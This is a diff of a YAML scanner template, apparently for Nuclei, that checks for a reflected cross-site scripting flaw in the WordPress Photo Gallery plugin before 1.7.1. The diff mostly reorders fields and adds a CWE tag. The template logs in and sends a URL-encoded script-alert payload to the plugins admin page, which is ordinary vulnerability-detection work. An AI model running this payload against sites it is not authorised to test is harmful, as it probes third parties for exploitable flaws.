@@ -1,5 +1,4 @@
 id: photo-gallery-xss
-
 info:
   name: Photo Gallery < 1.7.1 - Cross-Site Scripting
   author: ritikchaddha
@@ -11,18 +10,34 @@ info:
     - https://wpscan.com/vulnerability/e9f9bfb0-7cb8-4f92-b436-f08442a6c60a
     - https://wordpress.org/plugins/photo-gallery/advanced/
   classification:
+    cwe-id:
+      - CWE-80
     cpe: cpe:2.3:a:10web:photo_gallery:*:*:*:*:wordpress:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag authenticated
-    verified: true
     max-request: 2
-    vendor: 10web
     product: photo_gallery
-    publicwww-query: "/wp-content/plugins/photo-gallery"
-  tags: wpscan,wp,wp-plugin,wordpress,xss,photo-gallery,authenticated,vuln
-
+    publicwww-query: /wp-content/plugins/photo-gallery
+    vendor: 10web
+    verified: true
+  tags: authenticated,photo-gallery,vuln,wordpress,wp,wp-plugin,wpscan,xss
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        part: body_2
+        type: word
+        words:
+          - '><script>alert(/XSS/)</script>'
+          - Installed Plugins
+      - part: header_2
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /wp-login.php HTTP/1.1
         Host: {{Hostname}}
@@ -32,22 +47,3 @@ http:
       - |
         GET /wp-admin/plugins.php?%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body_2
-        words:
-          - '><script>alert(/XSS/)</script>'
-          - 'Installed Plugins'
-        condition: and
-
-      - type: word
-        part: header_2
-        words:
-          - text/html
-
-      - type: status
-        status:
-          - 200
-
